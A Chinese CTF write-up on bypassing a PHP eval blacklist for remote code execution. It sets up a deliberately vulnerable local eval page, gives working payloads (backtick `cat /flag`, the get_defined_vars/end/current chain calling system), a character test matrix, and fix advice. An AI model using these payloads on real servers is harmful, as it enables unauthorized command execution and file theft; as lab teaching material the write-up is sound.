---
title: "PHP 无参数 RCE 绕过"
slug: "ctf-php-parameterless-rce"
date: 2026-08-30T22:38:37+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "无参数远程代码执行经典题：利用 PHP 内置函数完成命令执行。"
summary: "无参数远程代码执行经典题：利用 PHP 内置函数完成命令执行。"
tags: ["CTF", "PHP", "RCE"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 9
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/9.非常经典的php无参数RCE绕过（无参数远程代码执行）.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-php-parameterless-rce/workflow.svg" alt="在 $、引号和括号被限制时，用内置函数读取当前作用域中的请求变量。" loading="lazy">
  <figcaption>图 1 · PHP 无参数 RCE 绕过。在 $、引号和括号被限制时，用内置函数读取当前作用域中的请求变量。</figcaption>
</figure>

## 1. 先澄清原笔记里的源码问题

原始笔记记录的黑名单包含 `(`、`)`、`$`、引号等字符，但给出的
`eval(end(current(get_defined_vars())));` payload 本身包含括号。两者存在冲突。

因此复现时必须先以题目真实源码为准，再用本地 PHP 环境验证每个字符是否允许。

## 2. 本地环境

创建 `/tmp/phprce/index.php`：

```php
<?php
$input = $_GET['tgctf2025'] ?? '';
$blocked = '/0|1|[3-9]|[~\'@#$%^&*()\-=+{}\[\]:",<>]|i/';

if (!preg_match($blocked, $input)) {
    eval($input);
} else {
    echo "blocked";
}
```

创建 `/flag` 或把测试文件放到可读取路径：

```bash
echo 'flag{parameterless_demo}' | sudo tee /flag
```

启动：

```bash
cd /tmp/phprce
php -S 127.0.0.1:8080
```

## 3. 先测允许字符

```bash
curl -sS --get --data-urlencode 'tgctf2025=echo HELLO;' \
  'http://127.0.0.1:8080/'
```

如果回显 `HELLO`，说明基础 eval 可用。若返回 `blocked`，逐字符缩小黑名单。

## 4. 反引号执行

PHP 反引号等价于 shell 命令执行：

```bash
curl -sS --get \
  --data-urlencode 'tgctf2025=echo `cat /flag`;' \
  'http://127.0.0.1:8080/'
```

这里的反引号由 `--data-urlencode` 编码，本地 shell 不会执行它。预期：

```text
flag{parameterless_demo}
```

如果题目确实允许反引号，这是最短链路；如果反引号被额外过滤，再使用 `get_defined_vars` 方案。

## 5. get_defined_vars 方案的前提

该方案要求括号至少可用：

```text
?tgctf2025=eval(end(current(get_defined_vars())));&b=system('cat /flag');
```

执行顺序：

1. `get_defined_vars()` 返回当前变量表；
2. `current()` 取到 `_GET`；
3. `end()` 取到最后一个参数 `b`；
4. 外层 `eval()` 执行 `system('cat /flag');`。

如果 `(`、`)` 或 `$` 被过滤，这个 payload 不成立。原笔记里没有足够信息证明该题的实际黑名单，因此不能把它写成“必然成功”的结论。

## 6. 测试矩阵

| 字符/函数 | 是否可用 | 替代方案 |
| --- | --- | --- |
| 反引号 | 先测 | `system` / `shell_exec` |
| `()` | 若被禁 | 反引号、include、文件写入 |
| `$` | 若被禁 | `get_defined_vars` |
| 引号 | 若被禁 | 常量、函数返回值、编码 |
| 数字 | 若被禁 | 字符串运算、预定义常量 |

## 7. 排错

- 页面直接空白：看 PHP 错误日志和 `eval` 语法错误；
- 每个 payload 都 blocked：先把黑名单搬到本地逐字符测试；
- `/flag` 不存在：先用 `pwd`、`ls` 找到目标文件；
- 命令执行无回显：用授权监听端验证外带，不要盲目换 Shell。

## 8. 修复建议

- 不把用户输入交给 `eval`；
- 不用黑名单做安全边界；
- 使用固定模板和允许列表；
- 禁止命令执行函数；
- 对输入长度、字符集和调用栈做限制。
